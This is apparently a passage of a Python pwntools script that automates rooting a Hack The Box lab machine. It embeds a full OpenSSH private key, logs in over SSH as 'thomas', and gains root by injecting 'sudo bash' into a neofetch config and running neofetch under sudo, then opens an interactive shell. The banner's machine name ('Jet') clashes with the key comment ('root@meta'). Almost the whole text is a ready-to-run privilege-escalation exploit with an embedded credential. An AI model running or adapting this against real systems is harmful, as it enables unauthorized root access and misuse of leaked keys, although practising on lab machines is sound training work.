try:
    request = ssh(host='10.10.11.140', user='thomas', keyfile='key')
    print("\n[\033[1;32m+\033[1;37m] Continue.........\n")
except:
    print("\n[\033[1;31m!\033[1;37m] Please You must first create RSA key file with this RSA key\n\n[\033[1;31m!\033[1;37m] -----BEGIN OPENSSH PRIVATE KEY-----
          \n\n[\033[1;31m!\033[1;37m]b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
          \n\n[\033[1;31m!\033[1;37m]NhAAAAAwEAAQAAAYEAt9IoI5gHtz8omhsaZ9Gy+wXyNZPp5jJZvbOJ946OI4g2kRRDHDm5
          \n\n[\033[1;31m!\033[1;37m]x7up3z5s/H/yujgjgroOOHh9zBBuiZ1Jn1jlveRM7H1VLbtY8k/rN9PFe/MkRsYdH45IvV
          \n\n[\033[1;31m!\033[1;37m]qMgzqmJPFAdxmkD9WRnVP9OqEF0ZEYwTFuFPUlNq5hSbNRucwXEXbW0Wk7xdXwe3OJk8hu
        \n\n[\033[1;31m!\033[1;37m]ajeY80riz0S8+A+OywcXZg0HVFVli4/fAvS9Im4VCRmEfA7jwCuh6tl5JMxfi30uzzvke0
        \n\n[\033[1;31m!\033[1;37m]yvS1h9asqvkfY5+FX4D9BResbt9AXqm47ajWePksWBoUwhhENLN/1pOgQanK2BR/SC+YkP
        \n\n[\033[1;31m!\033[1;37m]nXRkOavHBxHccusftItOQuS0AEza8nfE5ioJmX5O9+fv8ChmnapyryKKn4QR4MAqqTqNIb
        \n\n[\033[1;31m!\033[1;37m]7xOWTT7Qmv3vw8TDZYz2dnlAOCc+ONWh8JJZHO9i8BXyHNwAH9qyESB7NlX2zJaAbIZgQs
        \n\n[\033[1;31m!\033[1;37m]Xkd7NTUnjOQosPTIDFSPD2EKLt2B1v3D/2DMqtsnAAAFgOcGpkXnBqZFAAAAB3NzaC1yc2
        \n\n[\033[1;31m!\033[1;37m]EAAAGBALfSKCOYB7c/KJobGmfRsvsF8jWT6eYyWb2zifeOjiOINpEUQxw5uce7qd8+bPx/
        \n\n[\033[1;31m!\033[1;37m]8ro4I4K6Djh4fcwQbomdSZ9Y5b3kTOx9VS27WPJP6zfTxXvzJEbGHR+OSL1ajIM6piTxQH
        \n\n[\033[1;31m!\033[1;37m]cZpA/VkZ1T/TqhBdGRGMExbhT1JTauYUmzUbnMFxF21tFpO8XV8HtziZPIbmo3mPNK4s9E
        \n\n[\033[1;31m!\033[1;37m]vPgPjssHF2YNB1RVZYuP3wL0vSJuFQkZhHwO48AroerZeSTMX4t9Ls875HtMr0tYfWrKr5
        \n\n[\033[1;31m!\033[1;37m]H2OfhV+A/QUXrG7fQF6puO2o1nj5LFgaFMIYRDSzf9aToEGpytgUf0gvmJD510ZDmrxwcR
        \n\n[\033[1;31m!\033[1;37m]3HLrH7SLTkLktABM2vJ3xOYqCZl+Tvfn7/AoZp2qcq8iip+EEeDAKqk6jSG+8Tlk0+0Jr9
        \n\n[\033[1;31m!\033[1;37m]78PEw2WM9nZ5QDgnPjjVofCSWRzvYvAV8hzcAB/ashEgezZV9syWgGyGYELF5HezU1J4zk
        \n\n[\033[1;31m!\033[1;37m]KLD0yAxUjw9hCi7dgdb9w/9gzKrbJwAAAAMBAAEAAAGAFlFwyCmMPkZv0o4Z3aMLPQkSyE
        \n\n[\033[1;31m!\033[1;37m]iGLInOdYbX6HOpdEz0exbfswybLtHtJQq6RsnuGYf5X8ThNyAB/gW8tf6f0rYDZtPSNyBc
        \n\n[\033[1;31m!\033[1;37m]eCn3+auUXnnaz1rM+77QCGXJFRxqVQCI7ZFRB2TYk4eVn2l0JGsqfrBENiifOfItq37ulv
        \n\n[\033[1;31m!\033[1;37m]kroghSgK9SE6jYNgPsp8B2YrgCF+laK6fa89lfrCqPZr0crSpFyop3wsMcC4rVb9m3uhwc
        \n\n[\033[1;31m!\033[1;37m]Bsf0BQAHL7Fp0PrzWsc+9AA14ATK4DR/g8JhwQOHzYEoe17iu7/iL7gxDwdlpK7CPhYlL5
        \n\n[\033[1;31m!\033[1;37m]Xj6bLPBGmRkszFdXLBPUrlKmWuwLUYoSx8sn3ZSny4jj8x0KoEgHqzKVh4hL0ccJWE8xWS
        \n\n[\033[1;31m!\033[1;37m]sLk1/G2x1FxU45+hhmmdG3eKzaRhZpc3hzYZXZC9ypjsFDAyG1ARC679vHnzTI13id29dG
        \n\n[\033[1;31m!\033[1;37m]n7JoPVwFv/97UYG2WKexo6DOMmbNuxaKkpetfsqsLAnqLf026UeD1PJYy46kvva1axAAAA
        \n\n[\033[1;31m!\033[1;37m]wQCWMIdnyPjk55Mjz3/AKUNBySvL5psWsLpx3DaWZ1XwH0uDzWqtMWOqYjenkyOrI1Y8ay
        \n\n[\033[1;31m!\033[1;37m]JfYAm4xkSmOTuEIvcXi6xkS/h67R/GT38zFaGnCHh13/zW0cZDnw5ZNbZ60VfueTcUn9Y3
        \n\n[\033[1;31m!\033[1;37m]8ZdWKtVUBsvb23Mu+wMyv87/Ju+GPuXwUi6mOcMy+iOBoFCLYkKaLJzUFngOg7664dUagx
        \n\n[\033[1;31m!\033[1;37m]I8qMpD6SQhkD8NWgcwU1DjFfUUdvRv5TnaOhmdNhH2jnr5HaUAAADBAN16q2wajrRH59vw
        \n\n[\033[1;31m!\033[1;37m]o2PFddXTIGLZj3HXn9U5W84AIetwxMFs27zvnNYFTd8YqSwBQzXTniwId4KOEmx7rnECoT
        \n\n[\033[1;31m!\033[1;37m]qmtSsqzxiKMLarkVJ+4aVELCRutaJPhpRC1nOL9HDKysDTlWNSr8fq2LiYwIku7caFosFM
        \n\n[\033[1;31m!\033[1;37m]N54zxGRo5NwbYOAxgFhRJh9DTmhFHJxSnx/6hiCWneRKpG4RCr80fFJMvbTod919eXD0GS
        \n\n[\033[1;31m!\033[1;37m]1xsBQdieqiJ66NOalf6uQ6STRxu6A3bwAAAMEA1Hjetdy+Zf0xZTkqmnF4yODqpAIMG9Um
        \n\n[\033[1;31m!\033[1;37m]j3Tcjs49usGlHbZb5yhySnucJU0vGpRiKBMqPeysaqGC47Ju/qSlyHnUz2yRPu+kvjFw19
        \n\n[\033[1;31m!\033[1;37m]keAmlMNeuMqgBO0guskmU25GX4O5Umt/IHqFHw99mcTGc/veEWIb8PUNV8p/sNaWUckEu9
        \n\n[\033[1;31m!\033[1;37m]M4ofDQ3csqhrNLlvA68QRPMaZ9bFgYjhB1A1pGxOmu9Do+LNu0qr2/GBcCvYY2kI4GFINe
        \n\n[\033[1;31m!\033[1;37m]bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=
-----END OPENSSH PRIVATE KEY-----\n")
    exit(1)
try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Pawn Hackthebox Machine Jet ~ 3mm412\n")
except:
    print("\n[\033[1;31m!\033[1;37m] The script needs root privileges\n\n[\033[1;31m!\033[1;37m] Remember to have the pwntools library installed\n")
    exit(1)
    
def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, kill)

rsa = ('-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAt9IoI5gHtz8omhsaZ9Gy+wXyNZPp5jJZvbOJ946OI4g2kRRDHDm5\nx7up3z5s/H/yujgjgroOOHh9zBBuiZ1Jn1jlveRM7H1VLbtY8k/rN9PFe/MkRsYdH45IvV\nqMgzqmJPFAdxmkD9WRnVP9OqEF0ZEYwTFuFPUlNq5hSbNRucwXEXbW0Wk7xdXwe3OJk8hu\najeY80riz0S8+A+OywcXZg0HVFVli4/fAvS9Im4VCRmEfA7jwCuh6tl5JMxfi30uzzvke0\nyvS1h9asqvkfY5+FX4D9BResbt9AXqm47ajWePksWBoUwhhENLN/1pOgQanK2BR/SC+YkP\nnXRkOavHBxHccusftItOQuS0AEza8nfE5ioJmX5O9+fv8ChmnapyryKKn4QR4MAqqTqNIb\n7xOWTT7Qmv3vw8TDZYz2dnlAOCc+ONWh8JJZHO9i8BXyHNwAH9qyESB7NlX2zJaAbIZgQs\nXkd7NTUnjOQosPTIDFSPD2EKLt2B1v3D/2DMqtsnAAAFgOcGpkXnBqZFAAAAB3NzaC1yc2\nEAAAGBALfSKCOYB7c/KJobGmfRsvsF8jWT6eYyWb2zifeOjiOINpEUQxw5uce7qd8+bPx/\n8ro4I4K6Djh4fcwQbomdSZ9Y5b3kTOx9VS27WPJP6zfTxXvzJEbGHR+OSL1ajIM6piTxQH\ncZpA/VkZ1T/TqhBdGRGMExbhT1JTauYUmzUbnMFxF21tFpO8XV8HtziZPIbmo3mPNK4s9E\nvPgPjssHF2YNB1RVZYuP3wL0vSJuFQkZhHwO48AroerZeSTMX4t9Ls875HtMr0tYfWrKr5\nH2OfhV+A/QUXrG7fQF6puO2o1nj5LFgaFMIYRDSzf9aToEGpytgUf0gvmJD510ZDmrxwcR\n3HLrH7SLTkLktABM2vJ3xOYqCZl+Tvfn7/AoZp2qcq8iip+EEeDAKqk6jSG+8Tlk0+0Jr9\n78PEw2WM9nZ5QDgnPjjVofCSWRzvYvAV8hzcAB/ashEgezZV9syWgGyGYELF5HezU1J4zk\nKLD0yAxUjw9hCi7dgdb9w/9gzKrbJwAAAAMBAAEAAAGAFlFwyCmMPkZv0o4Z3aMLPQkSyE\niGLInOdYbX6HOpdEz0exbfswybLtHtJQq6RsnuGYf5X8ThNyAB/gW8tf6f0rYDZtPSNyBc\neCn3+auUXnnaz1rM+77QCGXJFRxqVQCI7ZFRB2TYk4eVn2l0JGsqfrBENiifOfItq37ulv\nkroghSgK9SE6jYNgPsp8B2YrgCF+laK6fa89lfrCqPZr0crSpFyop3wsMcC4rVb9m3uhwc\nBsf0BQAHL7Fp0PrzWsc+9AA14ATK4DR/g8JhwQOHzYEoe17iu7/iL7gxDwdlpK7CPhYlL5\nXj6bLPBGmRkszFdXLBPUrlKmWuwLUYoSx8sn3ZSny4jj8x0KoEgHqzKVh4hL0ccJWE8xWS\nsLk1/G2x1FxU45+hhmmdG3eKzaRhZpc3hzYZXZC9ypjsFDAyG1ARC679vHnzTI13id29dG\nn7JoPVwFv/97UYG2WKexo6DOMmbNuxaKkpetfsqsLAnqLf026UeD1PJYy46kvva1axAAAA\nwQCWMIdnyPjk55Mjz3/AKUNBySvL5psWsLpx3DaWZ1XwH0uDzWqtMWOqYjenkyOrI1Y8ay\nJfYAm4xkSmOTuEIvcXi6xkS/h67R/GT38zFaGnCHh13/zW0cZDnw5ZNbZ60VfueTcUn9Y3\n8ZdWKtVUBsvb23Mu+wMyv87/Ju+GPuXwUi6mOcMy+iOBoFCLYkKaLJzUFngOg7664dUagx\nI8qMpD6SQhkD8NWgcwU1DjFfUUdvRv5TnaOhmdNhH2jnr5HaUAAADBAN16q2wajrRH59vw\no2PFddXTIGLZj3HXn9U5W84AIetwxMFs27zvnNYFTd8YqSwBQzXTniwId4KOEmx7rnECoT\nqmtSsqzxiKMLarkVJ+4aVELCRutaJPhpRC1nOL9HDKysDTlWNSr8fq2LiYwIku7caFosFM\nN54zxGRo5NwbYOAxgFhRJh9DTmhFHJxSnx/6hiCWneRKpG4RCr80fFJMvbTod919eXD0GS\n1xsBQdieqiJ66NOalf6uQ6STRxu6A3bwAAAMEA1Hjetdy+Zf0xZTkqmnF4yODqpAIMG9Um\nj3Tcjs49usGlHbZb5yhySnucJU0vGpRiKBMqPeysaqGC47Ju/qSlyHnUz2yRPu+kvjFw19\nkeAmlMNeuMqgBO0guskmU25GX4O5Umt/IHqFHw99mcTGc/veEWIb8PUNV8p/sNaWUckEu9\nM4ofDQ3csqhrNLlvA68QRPMaZ9bFgYjhB1A1pGxOmu9Do+LNu0qr2/GBcCvYY2kI4GFINe\nbhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=\n-----END OPENSSH PRIVATE KEY-----')

os.system('echo "%s" > key' % (rsa))

request = ssh(host='10.10.11.140', user='thomas', keyfile='key')
shell = request.process("/bin/sh")
shell.sendline(b"echo 'sudo bash' >> ~/.config/neofetch/config.conf; export XDG_CONFIG_HOME=$PWD/.config; sudo neofetch")
time.sleep(0.3)
shell.sendline(b"export HOME=/root; cd; echo 'uid=0(root)'")
time.sleep(0.3)
shell.interactive()
